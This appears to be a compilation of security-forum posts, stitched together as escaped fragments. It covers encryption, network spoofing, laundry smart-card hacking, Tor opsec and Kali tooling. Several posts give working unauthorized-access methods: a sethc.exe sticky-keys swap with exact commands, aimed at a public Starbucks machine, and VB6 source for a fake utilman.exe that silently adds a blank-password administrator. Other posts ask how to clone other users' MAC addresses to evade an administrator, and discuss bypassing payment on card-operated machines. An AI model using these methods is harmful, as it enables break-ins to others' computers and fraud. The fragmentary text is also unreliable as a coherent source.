hashed to compare anything to. Decryption of a block of data happens whether you know the key or not, if its wrong you get garbage back out again. When you decrypt something successfully its not garbage, there are lots of ways to verify that decryption has been successful.\n\nSo with nothing to compare to, you can't build a big lookup table to compare things against, this is hurt further by the fact that you can't build up a look up table for data, because now you need a table including every key encrypting every single piece of information. This is getting very big.\n\nHashes are used on encryption keys because people are lazy and choose bad passwords. A hash will do a relatively good job of making a small amount of data, into a slightly bigger standard amount, which is what encryption algorithms want from a key (padding with 0's would be a bad idea). Hashing doesn't improve the security more than that, because an attack probably knows that they key was hashed before and what algorithm was used. They could use a rainbow table then to find out the original password, but given they are probably more interested in the contents of encrypted file than the original password, they are unlikely to do this.\n\nPeople are getting confused between a \"backdoor\" in an algorithm and a exploit in the math being discovered which reduces the amount of time to brute-force the algorithm. A backdoor is almost certain to have been discovered in testing of the algorithm. A method for reducing time however is a real possibility, but it won't be by much as again, a big flaw would have been picked up already.

Using other encryption algorithms that have different advantages, like a particularly low memory usage for an embedded device is an example of a good reason. Also everyone forget about ever creating your own algorithm, we all should know how that ends up!\n", "\nThe export of cryptographic algorithm is often heavily prohibited and they are often treated as military assets. I don't know of anyone which bans the import of them, but certainly some countries make it illegal for their citizens to use them, given the internet now, it is extremely difficult to manage this sort of thing.\n\nThe US government generally doesn't care for backdoors anyway, they just prefer to put restrictions on shipping software, earlier US versions of IE were only allowed to use 64-bit versions of algorithms in SSL, so the government could break it if they wanted. I'll try and find a reference to that tonight.\n", "\n\n\nThis is why I don't use TrueCrypt, they go about certain ways which are completely irrelevant and pointless. Hashing data multiple times does nothing but waste resources. For example, say you have some data (D), you hash that, and keep that (H1), hash it again and you get the output (H2) and you can see your way through the path. Now you want to build an exhaustive dictionary to brute-force with, fine.\n\nNow in building this exhaustive dictionary, you build it up, your going to have D, H1 and H2 in your dictionary to try, so you hash them to find and you get H(D) = H1, H(H1) = H2 and H(H2) = new hash but also in your dictionary. So I've found the key which was used and I've only done one hash, not two.\n\nYou say encryption programs do it to waste resources, wasting resources does nothing to help anyone. A good encryption algorithm does not go through stages of activity, which could then help an attacker decrypt the information by looking at process cpu usage while it is encrypting, there is no need to waste resource to flatten out resource usage if your algorithm is good.\n\nAlso I hate the TrueCrypt documentation for using \"Salt\" everywhere, salts really aren't that useful with encryption, if you use the proper definition of a salt. Without reading any more of their documentation I think they mean initialization vector. Which is random data used in the algorithm to prevent the same data encrypted with the same key at different times looking the same, as if it did this would be valuable information to an attacker. IVs are sent in the clear with the encrypted data, so anyone can read them if they want, they are designed to be of no use to an attacker, salts have to be kept secret and you would have to remember them so that you could apply them every time you wanted to decrypt your information. At which point you have to keep it like a password and it serves no additional use.\n", "\n\n\nThe reason isn't to take longer generating the hash at all. Nearly all hash and encryption algorithms have a number of rounds which, loosely, the more rounds the more messed up the information. But due to some quirks of Maths, if you do certain numbers of rounds they will be significantly less secure than if you added a couple more. The number of rounds that the algorithms do is normally set on the implementation.\n\nPasswords should always be hashed as the first thing that happens, even before looking up a username to compare the hashes against.

Also, I have one IP address given to me. However, I would like to be able to have multiple devices (an xbox 360) set up to the internet at once. I know this is easily done with a router, but I don't have a router and also a router defeats my plans to not use up my own bandwith (yes I'm an asshole).\n\nI do have a switch though, which effectively just increases the number of ports I have access to. So I hooked up my xbox to this but, unfortunately, the building gateway or router or whatever refuses to lease me an IP address for the xbox. So I manually set the xbox's IP address, by extrapolating from my own IP address. This worked fine for a while until my internet was shut down for IP hopping.\n\nI believe they caught me through my MAC address. My internet is now back, and I would like to resume my consequence free downloading and gaming. My question is how do I do this so I am not caught. What can a network administrator see about my connection? Are the logs they keep of IP Hostname and MAC address tied to a physical ethernet port? If I were to change my MAC address (on the xbox) to that of another computers MAC address on the network, would an administrator be able to tell that the machine apparently moved from one room to another, or only that this machine is signing on? How can I obtain information about other people who are on the network (specifically hostname and MAC and matching IP) so I can pretend to be them?\n\nI thought this might be useful: I changed the MAC address and Hostname of my computer, and then tried to renew my IP. The building router refused to lease me an IP. However, I was able to manually put in the old IP I had and everything works fine.\n", "\n\n\nICS won't work unless you have two separate network cards.

Look for more information on http://www.windowsusers.org/wifi_defense.html The original site (OTO) seems down, but the program is still widely available...\n\nOnce Wi-Fi defense is installed it scans your network and presents to you a list of devices (computers) and ask you if they are Friend, Foe, or Unknown. It gives you their IP address, MAC address, Net Name, and manufacturer. From that information you can figure out if they are Friend or Foe to allow them on the network. If Unknown you certainly don t want them. If someone need tries to piggy-back onto your signal a pop-up window will alert you and ask you if they are Friend, Foe, or Unknown. It worked on both my 802.11g and b cards. If you find in the future you want to change the classification of visitor (you were mistaken, or they just ticked you off) you can edit the visitor or delete them from the list.\n\nClicking on Wireless Security gives you options for Notification, that will have it tell you when someone new is scanned on the network.

I change my setting for my main computerWi-Fi defense options menu from friend to foe. It only change the color setting but, did not kick it off. If you are using a wireless access point in conjunction with a router (two separate pieces of equipment), make sure you put the address of your access point into the Access Point Address field on the Network tab. Once security is enabled if you need to add new visitors (friends) then you can click on Add Friend To Network wizard.\n\nYou can run reports on visitors to see when they came on and how long they were there. Network report shows the MAC address, when they were first there and the amount of time on the network. Visitors will be listed in one of two groups, either Connected or Not Connected.

I have two problems with them: They are very general how too videos that do not lend themselves to a deeper understanding of what is going on with the attack or the program. They are more like what I would make for a friend that doesn't know anything about hacking, not someone trying to understand the mechanics of a hack or a program. So their troubleshooting value is a zero. Secondly, none of his material covers anything past v.0.7, the current version is v3.7.1. It maybe the same program but you'll find that things can change dramatically.\nFor example: even though I have tried tweakin the config file to see if I have/had something wrong in there. There could be a setting some where that I don't have right that I am unaware of that may not of been present in the v0.7, but is present in 3.7.1. There appear to be numerous features relevent to the webattacks vector that are present in 3.7.1, but not present in any of his videos.\nRight now, I just finished trying some of the other options on the web attack vector thinking that maybe it was just site cloning that was not working. Unfortunately nothing worked. I'm pretty stuck on this, kind of wondering if there is a bug in the current version, but there is no forum on the SE website or trustedsec.com.\n", "\nYou where able to execute the attack on a similiar/the same set up with out doing anything special?

Also, if you had ever used SET  you would know that it isn't configured for BT5 at all. You have to go into the config file and set it up yourself.\nAlso, while in most circumstances, running \"apt-get update && apt-get dist-upgrade,\" is a very valid troubleshooting step. However, R3 is less than three weeks old, and I already stated that I am running it. So how much value can we assume that updating my distro is going to add to our trouble shooting process? I don't want to disuade or discourage anyone from helping me, but if you're not going to read anything I post, or follow along at all I could do with out the comments. If all you're going to do is pop in and suggest some very mundane uninformed steps I could do with out it.\nAlso, your comment that, \"most everything works out of the box in backtrack,\" just isn't true at all, if I had to guess you haven't dug very deep into what backtrack has to offer. Or hell, maybe you've just had phenomenal luck, what do I know.\nWhat would be very helpful, is if someone tried to replicate my results on their own system.

Yes I am using the IP address of the attacker machine for the reverse connection on the internal network I set up inside virtual box.\n", "\nI took my laptop with me to work yesturday and ran the attack with some limited success.

I was only able to get a connection after spamming the reload button on the victim machine. Unfortunately, that looks like it was a one time only event. I know not every attack is going to be successfull all the time, but I haven't been able to duplicate my own success since the other night. When I navigate to the attacker machine from the victim machine the webpages either don't load right or don't load at all. If I select the \"clone\" option from SET, the page simply will not load. The listener will pick up the connection then all activity will stop, and the attack doesn't go through.

If the problem occurs during a linux live boot, I would stop worrying about it, make them get off their asses and come out to replace everything.

The SmartCity card is shown so I bet some of the others designs are real cards/companies too. \n\nIn their software documentation they suggest what card reader they use, but considering the cards are infact standard smart cards, any iso7816 standard reader should work to read/write to the card. Then again, I haven't been able to read the ATR from the card yet, so perhaps I shouldn't say anything. I'll have to tinker with some baud rates and perhaps write my own driver. \n\nThanks for the link, knowing the atr of the card is a big break... now, time to go figure out why c8 is important in the documentation and what's going on with my reader.. and possibly why the card works at all with GND blocked :D\n", "\nYes, some cards have built in write protection passwords that once used up will keep the card from being used again.

I'm pretty sure the card I have is the AT88SC0404C or in that family. I'm making this assumption from the fact it has the same contact pattern design as what is shown in the spec sheet and the i-cat blog.\n\nIt's a shame this isn't a cheap pic/avr card like I was hoping for it to be...but hey, now it's fun although frustrating to try and figure out. \n\nI still haven't been able to read this card!\n\nThis is what I have done:\n\n-Tried reading with a standard ccid card reader: Nothing, card reader reports it can't power it on or get the atr.\n\n-Made my own serial card reader using a ftdi 5v serial-usb chip setup and a 3.579545Mhz crystal + some other components to support the clock. I read a sim card with it so I know it works. When I plug in the laundry card however, I get nothing... or if I do it's a bunch of d7 dd 77 f7 etc bytes. Shouldn't I get an ATR as soon as the card is powered up?\n\nI am assuming from the data sheet and iso standard the correct baud rate to communicate with the card is 9600 8e2 with no hardware/software flow control, but that just gives me parity-failing jibberish... so have the other settings I have tried (9600 8e1, 9600 8n1). Do you know for sure what the correct settings are? \n\nIt's interesting you point out the sniffer too.. I already built and tried using it a while ago.. I made it with an old ID card, gold foil tape, and seasons2 schematic (card reader slot, max232, non-inverting hex buffer +components).\n\nThe sniffer is how I discovered that c8 pin MUST be connected in order for transactions to occur. The data sheet says nothing about this.. so all I can think is as an extra security via obscurity measure they are checking the resistance between that pin and ground? I sure wish I had a logic analyzer.\n\nOh and for what I sniffed at the laundromat? Jibberish again! I used the same serial config settings as I used for the home made reader.\n\nAny more of your thoughts are appreciated. just being able to communicate with this chip would make my day. I already wrote some software to talk to it synchronously that isn't getting nearly the use I hoped it would by now. :)\n", "\nHope you are feeling better sirloins\n\nThanks for the tip with WinExplorer.. it accomplishes what I have written as a cli app... but likely works way better. :D  I picked up version 5.0 \n\nI now have a phoenix card programmer/reader here (so I shouldn't have to worry about pullup resistors possibly being the issue on lines now) that I used with WinExplorer and still haven't gotten an ATR. I tried a few settings, but looking over the documentation again 9600 8E1 does seems like the right setup... I'm 99% sure. So frustrating!! Any other thoughts? Thanks for the tips sofar.\n\nAs for that c8 pin, I did another test, I attached it and gnd to a voltmeter and found it gets at least 2.5V through it... hmm \n\nThat pin has about 6Mohm resistance between that and ground which slowly climbs the longer you measure the resistance. I think next time I do laundry I will throw in an appropriate resistor between the c8 seasons interface contact line and ground instead of connecting it to the c8 card pin to see what happens. Already I have tried just grounding c8 alone and that did not work.\n\nAnother observation I have made regards dryers. If you start a load, then plug the card in again, it deducts money from your card and adds individual minutes to the load time. This could be handy for sniffing purposes.\n\nWhat other progress have you made too? Cheers!\n", "\nNo progress sofar here, but I do have a hard lesson learned.. don't reverse the card vcc and gnd.

What company are your laundry services under (what does it say on your laundry card)?\n\nDo your laundry machines beep? It surprised me to see the buzzer on the white pcb.\n\nIn regard to the breakout pins in the card reader mechanisim, that's likely just a port they used to program the chip or something similar. Can you read the numbers off the philips chip for me?\n\nSpeaking of chips, that GDM1202A display should just be a generic part. If you search around enough, you could find out what interface it uses then using a uC make it say something such as \"FEED ME A SOCK\"\n\nOnce in the machine, I don't think bypassing the card mechanisim would be too hard either too. I don't see any logic circuitry on that white controller pcb. Is there another one under it? If not, you might be able to use the machine just by identifying what pins from the card reader mechanisim go to where on the pcb board and supplying them with the correct voltages to work the relays.. not 100% positive on this as those current pictures do not reveal too much.\n\nWill be interested to hear more about what you have accomplished!\n", "\nVERY interesting video. So lets break down what they did:\n\n- If the card's contact pattern and SmartCity labelling are any indication, this is an ESD AT88XXXC series card. likely the AT88SC0404C one.\n\n- It looks like they can read it with a standard card reader too.. as they should be able to. I wish that would work for me.  I'm assuming they are just running a command to dump the entire (or a portion) of memory in the video.\n\n-The uC was programmed with an AVR programmer and has 40 pins. ATMega32s fit that description and are popular too...\n\n-They broke out all 8 of the pins and in a rather clever way (even though they all aren't necessary). Still I like it. :)\n\n- They used the Saleae USB Logic analyser to read the I/O pin only. You can see in the video that they are monitoring two channels, and if you look even closer, both channels are very similar. That is probably because they are passing them through that uC to monitor/alter for *something*\n\nI wish I lived where they are, 1 machine cycle is 1.75 here... and that's a competitive rate in the area. It's absurd.\n", "\nCongratulations on your research, it looks like it turned out well. :)\n\nI have two burning questions on my mind right now:\n\n-Did you have to deal with the non-iso compliant C8 pin strangeness that I have complained about?\n\n-I'm thinking the the machine authenticates, checks balance, deducts balance, and starts the load.. but doesn't properly check if the balance was deducted so you either cut off communications after the check balance, or possibly just send back a \"balance written ok\" statement back to the card reader to get this working? Or am I way off?\n\nI will be interested to read your writeup.

You know it will happen, probably in the first few weeks while you are getting used to it. Ask yourself, who are you protecting against? Your kids playing without permission? If so then a simple screenlock would suffice.\n", "\n\nThe only way I'd say you can get what you want is to have something like thermite set up to kill the drives. A software solution would be to have an encrypted drive and then destroy the key but if it is something he knows then he will give it over at gun point.\nIf triple digit means he earns $100/day then I know people who earn a lot more than that and are a lot less paranoid, sounds a bit far fetched for me.\n", "\n\nThat wouldn't solve the problem of the attacker gaining access to the data when they put the gun against the guys head.\nAnd logicalconfusion you want the data gone, its the only truly secure way I can think of that is instant and unrecoverable.\n", "\nthe problem you are going to have with any software solution is that it takes a long time to wipe a drive. The only quick way to do it is to use full disk encryption and somehow forget the key.\nIf you know the key then you can be threatened till you reveal it so that is no good, you can't know the key.\nThe only way to do this then is to have a key that you never know. You could do this by storing the key in its own encrypted container and have the key for that change every time the machine boots, when you shut the machine down you are shown the key for the next boot. You then set it up so that you have a proximity detector which shuts the machine down if you walk away from it without showing the key.\nPut all that together and if you walk away then you don't see the next key and so can't boot the machine again, it is locked with an encryption key you never knew and the only way to get to it is through a key that you don't know because you never saw it.\nAnd if anyone ever uses something this complex then I reckon they will lose all their data within a week of setting it up.\n", "\nLarry from Pauldotcom did it as part of one of the big numbered shows (200, 250 maybe) and videoed it but the video never got released.

I'm sure Canonical will claim to have processes in place to prevent this but it can be a very hard thing to do as backdoors can be easy to hide if you have the skills.\n", "\n\nAm I telling you that? I don't see anywhere a comment on my opinions of closed source OSs or applications.\nWhat I'm saying about this story is that it is easier to make change from inside. If someone wants to make a malicious change then it is best to become trusted first, do some good then, once people have their guard down, slip in your change.\n", "\n\nSo can I assume that you like pink dresses and ball gags because you didn't mention them? Lack of mentioning something does not in any way imply feelings towards it. If you want my opinion then please ask for it, don't assume it as your assumptions so far have been wrong.\nSecurity vulnerabilities are usually caused by bugs, some very serious vulns are caused by very small changes, check out these two which slipped through the nets for a long time. The second one was a single line which made the app vulnerable. If someone malicious but trusted sneaks something like this in deliberately it could also take a long time to discover and could easily be put down to a mistake.

Any suggestions?\n", "\n\n\nJudging by your avatar, I'd say you're a Unix guy (Although I could be wrong). From what you're saying you are suggesting that there is no user called Administrator on any of the machines you see. That's like saying there's no root on any of your machines, updated or not. Updates may take care of kernel things/vulnerabilities like konboot, but the SYSTEM user is still there, and has no intention of going away. Here's how it works:\n\nThe login page is basically an executable, one that has to be run by a user that can startup really important things, and can't rely on dynamic[?] users, kinda like the nobody account on *nix systems, but with much, much more power. In this case, the login program uses the SYSTEM account to do it's dirty work, an account that can control EVERYTHING on the local system - like the kernel - and can never be told \"no\" by a higher power. After the machine is logged in, it hands over control to whatever user was selected. In my attack, I use this power against itself. When you hit shift 5 times to startup sticky keys at the login page, it ends up being run by the SYSTEM user. By replacing the sticky key executable (sethc.exe) with cmd.exe, one can boost the privileges through the SYSTEM account, ergo you have full root access to the machine. You can then use it with the net user command to unlock and change the Administrator password, then login using the newly changed credentials.\n\nSo at your starbucks machine, you'd throw in your handy dandy flash drive with your favorite *nix distro on it, restart the machine and get to at least a bash prompt. You casually type \"mkdir /media/disk/ ; mount.ntfs /dev/sda /media/disk/\" to mount the hard drive. Then you \"cd /media/disk/WINDOWS/System32/\" and \"rename sethc.exe sethc.exe.bak\" then \"cp cmd.exe sethc.exe\", \"unmount /media/disk/\", \"init 6\"/\"reboot\"/\"shutdown 6\" and take a long sip of your mocha while windows loads. Hit shift five times and cough to cover up the \"Bring---\" sound, and quickly type \"net user Administrator *\", and if nessicary \"net user Administrator /active:yes\", close the window and login as Administrator, then rain down your coffiey doom upon the machine.\n", "\n\n\nThat's the idea. Scenario:\n\n  Noob: Damnit! I hate not having Administrative privledges on this machine, all because of that flashdrive scare from china. Now I can't even use my wireless.\n\n  You: Allow me to be of assistance!\n\n           (Inserts thumbdrive, types furiously, and reboots. Types some more, bring-noise is heard, continues typing)\n\n          The password is 'noobsauce'. Have fun.\n", "\nI guess you could just unplug it from the internet. Or just unplug it all together. That'll show him!  :D \n\nBut really, In this case there is nothing to do but re-format. Just be careful if you have to back anything up. I wouldn't go copying any programs or executables. Just documents. It would really suck if you reformatted just to get it again from your backups. Also, you might not want to use a thumb drive or any other kind of media besides maybe DVD. If the malware knew what it was doing and is still running it would probably pounce on your autorun.inf as soon as you plug anything in.\n", "\n\n\nI remember reading somewhere that the kernel guys actually got a code submission that was bright-as-day malicious and quickly discarded. And if someone is that paranoid they can always compile their own kernel. Then again, they might not even be able to trust themselves.....  \n", "\n\n\nI prefer this method for resetting passwords:\n\nBoot into your favorite linux live CD. Mount the hard drive, and cd into C:\\WINDOWS\\System32\\. Make a copy/rename sethc.exe to sethc.exe.bak [or whatever]. Copy cmd.exe and rename the copy to sethc.exe. Reboot.\n\nAt the login page for windows, hit shift 5 times and you'll get a command prompt with SYSTEM privledges. The SYSTEM account exists on every windows machine and controlls the kernel and things like that. Type net user Administrator *  (or whatever username you want to reset) and bingo.\n\nI use this method all the time to unlock computers where people forget their password.

ThreatFire (not sure if you are familiar with it) is only used when i tell it to scan thats all it does no continuous scan or real-time defenses. It uses something along the lines of Avast's \"Code emulation\" to get rid of zero day threats and virus's that don't have definitions.\n\n\nComodo is a very good personal firewall, I have used it myself and its really effective and efficient, I would recommend using it over the windows built in firewall, as it will give you a better protection, no offense to Microsoft built in firewall, I just think Comodo does a better job at securing the system.\n\nDefinately love Comodo and agree with what you said. Is running windows firewall AND Comodo a bad idea? Only reason Windows firewall is running is because i haven't bothered turning it off and one of my programs wont work unless it's turned on (though not a big deal anyways).\n\n\nAvast 5 its what I use at home very good, very effective at detecting malware not as effective as Kaspersky tough but will keep your computer safe at 99.00% of all times.\n\nAgain I agree completely. I have used Kaspersky and i don't think any thing beats it lol. Love Avast been using it for years version 5 is so mush better too.\n\n\nDon't forget that, having a good firewall and antivirus is not going to make you 100% secured. You still have to patch things up, like update your software once a month.\n\nDefinitely. I upgrade every time there is a new update. Auto-update for windows and virus definitions. \n\n\nAs far as the computer security itself is concerned, its looks secure to me.\nAnother thing you could look at securing would be at the network level. You can build your own firewall box with PSFense/Untangle or buy a hardware based firewall. Most firewalls will do packet inspection which is not enough for securing a network, you want a more effective way for blocking attacks like IPDS.\n\n\nHaven't tackled the PSfense/Untagle yet going to try with my old dell as long as i can just plug my router in and have wifi kinda like MODEM to PSfense/Untangle TO aplha sheild to Router. Also Right now i have an AlphaShield and my routers build in firewall so i have 3 in total including Comodo. I have used SheildsUp! to check with all and each one individually all (Besides my router) gave me a PASS result with ALL ports stealth-ed so comodo and Alpha sheild do there jobs.

For iptables, ease, power, addons, Linux, etc. Untangle is the way to go.

Even though Linux is inheriently more secure then windows and even though 89% of exploits can only work on the same LAN and even though the ones that can be used over the internet are around 11% and most exploits not being critical (14%), there are allot of things to be worried about none the less. Chances are you wont be attacked but there is a chance. There is always a chance. As for Linux Use UFW or another firewall and you should be fine (Stealth all ports) or even deal with ip tables yourself and install ClamAV.

Also im trying to figure out a better way to gain Access to the NTFS partition.  Any input welcomed!\nGain SYSTEM/Administrative Access to Windows XP/2000\nI will explain how to gain Local Administrative rights to Windows XP/2000 computer without removing or cracking a Users password.  In order for this \nto work the Computer must have a CD-ROM drive, or other bootable device other then a harddrive.\n(Im stoned and its 3:15a.m. so i hope this makes sense)\nOverview:\nWindows XP/2000 allows you to run a program with System level privileges before logging on.  The name of the program is Utility Manager.  It is \nlocated at C:Windowssystem32utilman.exe for windows XP and C:WINNTSystem32utilman.exe for windows 2000. So all you have to do is make \nyour own program that creates an administrative account. The program that you create has to have a filename of Utilman.exe in order to work.\nIf the filesystem on the computer is FAT32 then this process is very simple and only takes a second.  If the Computer uses the NTFS filesystem this \nwill take a few minutes depending on how fast the PC is.\nFirst We need to make the program\nI used Visual Basic 6, here is my source code that i used to create the administrative account:\n#################################START###############################\nPrivate Sub Form_Load()\nShell \"net user NewAdmin \" & \"\"\"\"\"\" & \" /add\", vbHide\nPause (1)\nShell \"net localgroup administrators NewAdmin /add\", vbHide\nPause (1)\nmsgbox \"Added Administrative User\",16,\"Hacked XP\"\nEnd\nEnd Sub\nSub Pause(interval)\n'Pauses execution\nCurrent = Timer\nDo While Timer - Current < Val(interval)\nDoEvents\nLoop\nEnd Sub\n'#################################END###############################\nCompile this with the filename of Utilman.exe this is very important!  What this program does is create a  User named NewAdmin with a blank \npassword and then adds them to the Administrators Group.  \nOk Now that we've made the program lets move on... \nFAT32\n1. Create a bootable floppy :: http://1gighost.net/keywest/boot98sc.exe\n2. Add the newly made Utilman.exe to the Floppy\n3. Restart the computer with the floppy in it\n4. After DOS loads type C: and press enter.\n5. If it changes from A:/> to C:/> then your doing good\n6. use this command: Copy A:utilman.exe C:windowssystem32utilman.exe press Y to overwrite the exsisting file\n7. Restart the computer without the floppy in it\n8. When it gets to the Login Screen Press the Windows Key + U\n9. Restart the computer if FastUser Switching is enabled (The Graphical Login with the picture next to the login name, XP Only) if not enabled skip to Step 10 \n9a. After restarting you should see a new user in the list named NewAdmin, click on this account and you just gained Administrative access to your \nPC.\n10. After pressing <b>Windows Key + U</b> then type in the username NewAdmin and push Enter.  Thats It you now have administrative access to \nyour PC.\nNTFS\nUse a Windows 2000 Setup CD to gain access to the NTFS partition through the recovery console.  From the recovery console you can copy over the hacked Utilman.exe. Once in the recovery console follow the same instructions as above from step 6. After copying over the file restart your computer by typing exit or pusing ALT CTRL DEL.  Remove the Windows 2000 CD. When windows loads to the choose user screen simply push Windows Key + U. After pushing the Windows Key + U you should see a message that says \"Added Administrative User\", restart the computer one last time then choose the NewAdmin user account.  This will have Administrative Privileges.   It works ive done it and i hope you all enjoy this nice little hack ! ! !  (If your trying to gain SYSTEM level access your can replace the UTILMAN.exe to open a Command Prompt)\nLOL i hope that made sense\n", "\nhold CTRL and ALT and DOUBLE TAP the DEL key.......

Thus, I decided to create a video tutorial series on \"how to get started with Assembly for hackers\".\n\nThe series is far from complete yet. I will be posting follow up videos in this post as I make more. Here is the first couple I made today:\n\n1. System Organization concepts:\n\nhttp://securitytube.net/Assembly-Primer-fo...tion-video.aspx\n\nIn this first part, I explain the basics of computer organization, CPU registers - general purpose, segment and instruction pointer. Also covered is  virtual memory organization, program memory organization, program stack and stack operations.\n\n2. Virtual Memory Organization:\n\n\n\nhttp://securitytube.net/Assembly-Primer-fo...tion-video.aspx\n\nIn this video we take an in-depth look at virtual memory organization concepts. We look at how one can use the /proc/PID/maps to peek into the layout of a program's virtual memory and interpret useful things. Also, we show how the Address Space Layout Randomization (ASLR) works in the latest 2.6 kernels and why this is significant from a security point of view. We also show how this can be disabled at runtime if the need be. This video is very important from an code exploitation perspective as it teaches us how to check for the presence of ASLR on a given system. \n\n3. GDB Usage Primer:\n\nhttp://securitytube.net/Assembly-Primer-fo...imer-video.aspx\n\nIn this video we go through a quick primer on how to use GDB to disassemble code, set breakpoints, trace through code, examine CPU registers and memory locations, examine the program stack and many other important use cases which will help us in later videos when we actually start coding in Assembly and want to debug our code.\n\nComments and Feedback welcome! \n\nMore videos to be added over the weekend.\n", "\n\n\nNo, he is a different guy :)\n", "\nHello All,\n\nJust finished creating the next set of videos in the \"Assembly Language Primer for Hackers\" video series:\n\n4.

I'd say VPN + TOR + Proxychains is your best shot, but TOR's nowhere near as anonymous as it used to be. No idea what percent of exit nodes is actually feds now, but i bet it's a high number. I don't wanna go into a rant about the N$4/Trapwire/Datamining, but we live in an age where everything that you're paranoid about the government doing is 10 years late and now Google and Facebook actually have all that technology too. It's one big circle-jerk of trading/selling data\nIf you're worried about things like keeping your CC  & Banking info safe, buy Lifelock. If you want privacy, my best advice would be to start researching time travel maybe.... Everything that Anonymous was fighting for years ago is already in the past and too late to do anything about. If you really wanted to be anonymous you'd have to be an excellent criminal that stole your computer, uses a giant proxychain of the 30 nearest wifi signals you can hack before you even open your browser, never use google/facebook/twitter, keep electrical tape over the camera of every phone and laptop you own.... I mean even the Amazon Fire Tv STB has a microphone in the remote designed so you can never turn it off. \nIt's sad to say that it's best to just accept it.

The only exception is the fact i'll always have an Android phone so google will always get my business there. But other than that, if i know a company is making money off of data-mining me, i'm not also gonna give them MY money by buying their products.\nChances are if you have a reason to hide something it's already not a secret. That's my opinion on the subject anyway.... \nThis is a good video on the topic of how far gone anonymity is \n\n\n(Ok i ranted a little, sorry =P)\n", "\n\nIt's funny you say that about the island, cuz i was gonna make a joke about buying a boat and becoming a pirate in my rant =P\nThe thing about TOR is it really is an effective proxy except in the 2 most important places, checking in and checking out. Checking out is the point where you're vulnerable and why the government started creating their own exit nodes. And there's nothing you can do to change your odds of getting a \"legit\" exit node. Otherwise darknet wouldn't be darknet, it's random. So chances are, if you're constantly using TOR to block yourself, SOME of those times, a federal agent that had no idea who you were before, now has a .cap file with whatever you were doing there. \nSo there's 2 perspective's, mask yourself by using TOR for EVERYTHING, so the fact that you're there doesn't mean your doing something bad. Which would take forever to do anything cuz TOR=SLOW\nOr.... Use it VERY sparsely so hopefully you won't catch a fed exit node. I personally haven't used it since the first raid on Silk Road, and even then i just browsed around the forums a few times cuz i was curious. \n\nIf you can find a logless VPN company it would help, but most companies cooperate with the fbi, it's just how it is. So you really need to think how bad you need to keep your activity private. If you could find the most trustworthy VPN company in the world and exit through them....\nI don't know you, and i don't judge people, but your considering doing alot of stuff that in the end would probly keep your info from everybody except the people you're trying to hide from. If you're doing something on the scale that the N$4 would be interested, you're not hiding from them. There's no scenario, it's just how it is. \nHammond was a friggin beast, and he still caught 10 years. You think he wasn't doing everything possible to hide his actions? How about Sabu? Yes he's a punk-ass-snitch, but at one point he was an extremely intelligent cyber criminal... Probly one of the only \"Criminals\" out of everybody that he sent to prison ironically. I forget which member of the Lulz boat that stayed using other people's wifi -> TOR, so they ended up following the wifi signals to pinpoint where his bedroom was to prove it was him. Literally the wifi frequencies in the air....\nI mean it's possible to be a ghost \"hacker\" MAYBE, but not an anonymous person who uses the internet. \nIf you were trying to get away with stuff, i mean, laptops that can in no way trace back to you or anyone you know buying them. Getting prepaid wifi cards from some magical place that doesn't have security cameras....Never hacking from the same location twice.....stealing like a new laptop every week or month and bleaching the data daily just in case... You'd have to be pretty dedicated to it. If they're looking for you, it only takes one slip. Log into you're email from your home computer one time by accident cuz you forgot it was your \"other\" account, that's it, they know you now. Please understand \"EVERYBODY\" i'm speaking hypothetically here for the sake of conversation. \nI love to learn about security, but i really don't do anything that would piss off the government. So i can't give you first hand experience how to evade. I've read some great articles about OP-Sec and seen some great speeches about it.....I mean, you need to understand, this conversation where having now, by tomorrow Google, Facebook, Amazon and any other interested parties will probly have it logged on their server. If you're interested in getting away with something, you've already exposed yourself by posting here  without being anonymized. It's like leading 2 lives that can never in any way intersect. Its risky, and don't sound fun. If you wanted to be a black-hat, it's your seperate identity that has no connection to you.\nFor instance like alot of the Anonymous members who got locked up, had no business being arrested in the first place. Except they pissed off the government. Some of them cats really were freedom-fighters trying to help. It's still crazy to me that the biggest criminal amongst them flipped in an hour and got no jail time....  If you check out that vid i posted earlier, that guy actually works for the government. He references a book called like \"5 crimes a day\". He says there isn't a person in the world, that if he's targeting you he can't find at least 5 crimes a day he could charge you for. Like even your grandma. \nSo if you're like coming from the perspective of like, \"this\" or \"this\" seems like a good hustle, i wouldn't recommend it. And if you're gonna do something, don't try to get rich.....hypothetically.

Maybe it works better in pointing out what the actual problem might be?\nSee this post by repzeroworld for the -r2 version of the script.\nEdit:\nLooked closer at the actual script and the -r2 won't change anything since the check performed is identical.\nThe command the script uses to verify the interface is this:\n\nAnd as a quick aside, this would've been a cleaner version of that code:\n\nwhile true\ndo      read -p \"Which wireless interface you will be using? e.g wlan1, wlan2 etc\": WLAN\n\n        EXISTENCE_OF_WLAN=`airmon-ng|grep ''\"$WLAN\"|cut -f1`\n\n        if [  -z \"$WLAN\" -o \"$EXISTENCE_OF_WLAN\" != \"$WLAN\" ]\n        then    echo -e \"\\e[31m\\e[1mYou input a wireless interface that doesn't exist!\\e[0m\"\n        else    break\n        fi\ndone\nAs you can see, the core check performed here is that the \"EXISTENCE_OF_WLAN\" variable needs to end up being identical to the value in \"WLAN\" which is the input you provided.\nEXISTENCE_OF_WLAN gets it value from this command:\nairmon-ng|grep ''\"$WLAN\"|cut -f1\nWhere, again, $WLAN is the interface name you entered.\nThe first part is just invoking airmon-ng without parameters. I don't have it installed here, but according to the documentation here it simply outputs a list of wireless interfaces it knows about. Take a good look at the output for that usage example - there are a number of columns, the first being \"PHY\" and the second being \"Interface\". This output is passed on to the grep program which filters out all lines that don't contain the interface you provided, so if you provided an existing interface you should get just that one line with several columns, the first being the PHY and the second the interface.\nThis single line is then provided to the cut program with a parameter of \"-f1\" meaning to eliminate everything but the first field. That first field is the PHY and even in the example output it's never identical to the interface. So the problem you're having is that the script isolates the wrong field to compare against.\nThe fix is simple - replace \"cut -f1\" with \"cut -f2\".\nThe cause of this is either that new Kali has a newer airmon-ng which suddenly adds a PHY field to its output which it never did before, or your kernel now supports the PHY interface of devices (it can be config'd out) and airmon-ng dutifully reports it, which is something the script doesn't expect.\n\n", "\nOpen the file in a text editor.

